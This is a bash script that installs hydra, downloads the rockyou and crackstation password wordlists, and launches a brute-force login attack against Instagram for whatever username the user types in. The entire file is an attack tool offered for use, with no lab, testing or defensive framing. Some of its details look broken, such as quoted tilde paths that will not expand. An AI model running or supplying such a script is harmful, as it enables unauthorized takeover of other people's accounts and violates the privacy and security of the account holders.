#!/bin/bash

# Function to display a message and read user input
read_input() {
    local prompt=$1
    read -p "$prompt: " input
    echo "$input"
}

# Update and install dependencies
echo "Updating and installing necessary dependencies..."
sudo apt update
sudo apt install -y python3 python3-pip hydra wget

# Create the necessary directory structure
echo "Creating directory structure..."
mkdir -p ~/wordlists

# Download and extract password lists
echo "Downloading and extracting password lists..."
wget https://crackstation.net/files/crackstation.txt.gz -O ~/wordlists/crackstation.txt.gz
gunzip ~/wordlists/crackstation.txt.gz

wget https://github.com/blackplushacking/rockyou/raw/master/rockyou.txt -O ~/wordlists/rockyou.txt

# Function to brute-force an Instagram account
bruteforce_instagram() {
    local username=$1
    local password_list=$2

    echo "Brute-forcing Instagram account: $username"
    hydra -l $username -P $password_list instagram.com http-post-form "/accounts/login/:username=^USER^&password=^PASS^:F=incorrect" -V
}

# Prompt user for Instagram username
username=$(read_input "Enter the Instagram username to brute-force")

# Prompt user for password list
echo "Available password lists:"
echo "1. rockyou.txt"
echo "2. crackstation.txt"
read -p "Choose a password list (1/2): " choice
password_list=""
if [ "$choice" == "1" ]; then
    password_list="~/wordlists/rockyou.txt"
elif [ "$choice" == "2" ]; then
    password_list="~/wordlists/crackstation.txt"
else
    echo "Invalid choice. Defaulting to rockyou.txt."
    password_list="~/wordlists/rockyou.txt"
fi

# Run the brute-force attack
bruteforce_instagram "$username" "$password_list"
